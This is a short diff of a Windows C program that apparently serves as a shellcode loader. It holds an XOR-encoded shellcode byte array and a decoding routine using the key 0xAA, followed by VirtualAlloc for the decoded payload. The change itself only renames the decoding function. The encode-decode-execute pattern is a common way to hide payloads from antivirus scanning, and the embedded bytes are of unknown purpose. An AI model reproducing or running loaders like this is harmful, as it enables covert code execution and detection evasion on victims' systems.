@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <Windows.h>
 
-VOID XorByOneKey(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey);
+VOID Xor(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey);
 
 unsigned char encoded_buf[] =
 "\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x7a\xaa\xaa\xaa\xeb\xfb\xeb\xfa"
@@ -30,7 +30,7 @@ int main() {
 	SIZE_T shellcode_size = sizeof(encoded_buf);
 	IN BYTE key = 0xAA; // A mesma chave usada na codificação
 
-	XorByOneKey(encoded_buf, shellcode_size, key);
+	Xor(encoded_buf, shellcode_size, key);
 
 	void* buffer = VirtualAlloc(
 		NULL,
@@ -51,7 +51,7 @@ int main() {
 	return 0;
 }
 
-VOID XorByOneKey(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
+VOID Xor(PBYTE pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
 	for (size_t i = 0; i < sShellcodeSize; i++) {
 		pShellcode[i] = pShellcode[i] ^ bKey;
 	}
